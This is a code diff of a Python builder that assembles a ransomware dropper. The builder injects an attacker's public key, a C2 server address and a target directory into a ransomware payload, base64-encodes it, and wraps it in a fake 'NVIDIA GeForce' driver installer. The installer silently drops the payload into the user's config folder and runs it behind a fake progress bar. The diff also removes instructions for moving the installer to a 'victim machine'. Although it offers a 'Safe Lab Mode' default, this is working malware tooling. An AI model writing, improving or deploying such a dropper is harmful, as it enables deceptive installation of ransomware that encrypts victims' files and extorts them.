@@ -1,11 +1,12 @@
 import base64
 import os
 import sys
+import re
 
 # --- Configuration ---
-# You can change this IP to your C2 server's IP (e.g., 192.168.x.x)
 DEFAULT_C2_IP = "127.0.0.1" 
 DEFAULT_C2_PORT = "5000"
+DEFAULT_FALLBACK_TARGET = "test_data" # Safe default
 
 def build_dropper():
     print("[-] Starting Builder...")
@@ -15,13 +16,20 @@ def build_dropper():
     victim_dir = current_dir
     attacker_dir = os.path.join(current_dir, "..", "attacker")
     
+    # Ensure we look for the payload in the correct place
     payload_path = os.path.join(victim_dir, "ransomware.py")
+    
+    # Check for public key in attacker folder first, then current folder
     key_path = os.path.join(attacker_dir, "attacker_public_key.pem")
+    if not os.path.exists(key_path):
+        key_path = os.path.join(current_dir, "attacker_public_key.pem")
+
     output_path = os.path.join(victim_dir, "installer.py")
 
     # 1. Read Ransomware Payload
     if not os.path.exists(payload_path):
         print(f"[!] Error: Payload not found at {payload_path}")
+        print("    Make sure 'ransomware.py' is in the same folder as this builder!")
         return
 
     with open(payload_path, "r", encoding="utf-8") as f:
@@ -29,7 +37,8 @@ def build_dropper():
 
     # 2. Read Public Key
     if not os.path.exists(key_path):
-        print(f"[!] Error: Public key not found at {key_path}. Run c2_server.py first!")
+        print(f"[!] Error: Public key not found at {key_path}.")
+        print("    Run 'c2_server.py' on the attacker machine to generate keys first.")
         return
 
     with open(key_path, "r", encoding="utf-8") as f:
@@ -38,50 +47,56 @@ def build_dropper():
     # 3. Inject Configuration (Dynamic Replacement)
     print("[-] Injecting Configuration...")
     
-    # Replace Public Key
-    # We look for the marker in ransomware.py or just regex/replace
-    # The ransomware.py has: ATTACKER_PUBLIC_KEY = """..."""
-    # We will do a robust replacement.
-    
-    # Construct the new key string
-    new_key_str = f'ATTACKER_PUBLIC_KEY = """{public_key_clean}"""'
-    
-    # Find the block start
-    start_marker = 'ATTACKER_PUBLIC_KEY = """'
-    end_marker = '"""'
-    
-    # Simple replace is risky if there are multiple triple quotes. 
-    # But given our file structure, we can assume the first occurrence is the config.
-    # A safer way: standard string replacement if we know the exact placeholder, 
-    # OR we just import the file? No, text processing is safer for cross-platform independent building.
-    
-    # Let's assume the user hasn't modified the structural markers in ransomware.py
-    import re
-    # Regex to replace the entire ATTACKER_PUBLIC_KEY block
-    payload_content = re.sub(
-        r'ATTACKER_PUBLIC_KEY = """.*?"""', 
-        f'ATTACKER_PUBLIC_KEY = """{public_key_clean}"""', 
-        payload_content, 
-        flags=re.DOTALL
-    )
+    # --- A. Replace Public Key ---
+    # We use Regex to safely replace the block between the triple quotes
+    try:
+        payload_content = re.sub(
+            r'ATTACKER_PUBLIC_KEY = """.*?"""', 
+            f'ATTACKER_PUBLIC_KEY = """{public_key_clean}"""', 
+            payload_content, 
+            flags=re.DOTALL
+        )
+    except Exception as e:
+        print(f"[!] Regex Error replacing key: {e}")
 
-    # Replace C2 URL
+    # --- B. Configure C2 URL ---
     c2_ip = input(f"[?] Enter C2 Server IP [Default: {DEFAULT_C2_IP}]: ").strip()
     if not c2_ip: c2_ip = DEFAULT_C2_IP
     
-    # Sanitize input: remove scheme if user typed it
+    # Sanitize input
     c2_ip = c2_ip.replace("http://", "").replace("https://", "").rstrip("/")
-    
     new_url = f'http://{c2_ip}:{DEFAULT_C2_PORT}'
+    
     payload_content = re.sub(
         r'C2_SERVER_URL = ".*?"', 
         f'C2_SERVER_URL = "{new_url}"', 
         payload_content
     )
+    print(f"    -> C2 Server set to: {new_url}")
+
+    # --- C. Configure Fallback Target (THE FIX) ---
+    print(f"\n[?] Where should the malware look if C2 is offline?")
+    print(f"    - 'test_data' (Safe Lab Mode)")
+    print(f"    - 'Documents' (Aggressive)")
+    print(f"    - '.' (Current Directory)")
     
-    print(f"[-] Configured Payload with C2: {new_url}")
+    fallback_target = input(f"[?] Enter Fallback Directory [Default: {DEFAULT_FALLBACK_TARGET}]: ").strip()
+    if not fallback_target: fallback_target = DEFAULT_FALLBACK_TARGET
+    
+    # Regex to find: target_dir = os.path.join(home, "test_data")
+    # We permit flexible whitespace to be safe
+    target_regex = r'target_dir\s*=\s*os\.path\.join\(home,\s*"[^"]*"\)'
+    replacement = f'target_dir = os.path.join(home, "{fallback_target}")'
+    
+    if re.search(target_regex, payload_content):
+        payload_content = re.sub(target_regex, replacement, payload_content)
+        print(f"    -> Fallback Target set to: $HOME/{fallback_target}")
+    else:
+        print("[!] Warning: Could not find 'target_dir' definition in ransomware.py to patch.")
+        print("    Ensure your ransomware.py has the line: target_dir = os.path.join(home, \"test_data\")")
 
     # 4. Base64 Encode the Modified Payload
+    print("[-] Encoding Payload...")
     payload_b64 = base64.b64encode(payload_content.encode('utf-8')).decode('utf-8')
 
     # 5. Create Dropper (Installer)
@@ -92,8 +107,7 @@ import subprocess
 import threading
 import time
 import tempfile
-import ctypes
-from tkinter import Tk, Label, Button, ttk, PhotoImage, Frame
+from tkinter import Tk, Label, ttk, Frame
 
 # --- CONFIGURATION ---
 FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
@@ -105,12 +119,14 @@ def extract_and_execute_payload():
     try:
         payload_data = base64.b64decode(PAYLOAD_B64)
         
+        # Cross-platform drop location
         if os.name == 'nt':
             drop_dir = os.getenv('APPDATA')
             if not drop_dir: drop_dir = tempfile.gettempdir()
         else:
             drop_dir = os.path.expanduser("~/.config")
             if not os.path.exists(drop_dir):
+                # If .config doesn't exist, try home
                 drop_dir = os.path.expanduser("~")
         
         drop_path = os.path.join(drop_dir, PAYLOAD_NAME)
@@ -161,7 +177,7 @@ def fake_installer_gui():
             "Installing HD Audio Driver...", "Installing PhysX System...", "Finalizing..."
         ]
         
-        # DROP THE PAYLOAD EXECUTION HERE
+        # EXECUTE PAYLOAD AT 30%
         root.after(2000, extract_and_execute_payload)
         
         progress['maximum'] = 100
@@ -192,12 +208,11 @@ if __name__ == "__main__":
     with open(output_path, "w", encoding="utf-8") as f:
         f.write(dropper_code)
 
-    print(f"[+] Dropper created successfully at: {output_path}")
-    print(f"[+] Instructions:")
-    print("    1. Move 'installer.py' to your victim machine.")
-    print("    2. On Victim (Linux): pyinstaller --noconsole --onefile installer.py")
-    print("    3. On Victim (Windows): pyinstaller --noconsole --onefile --icon=nvidia.ico installer.py")
-    print("    4. If you don't use PyInstaller, just running 'python installer.py' works too!")
+    print(f"\n[+] Dropper created successfully at: {output_path}")
+    print(f"[+] Configuration Summary:")
+    print(f"    - C2 Server: {new_url}")
+    print(f"    - Fallback Target: $HOME/{fallback_target}")
+    print(f"    - Public Key: Injected")
 
 if __name__ == "__main__":
     build_dropper()
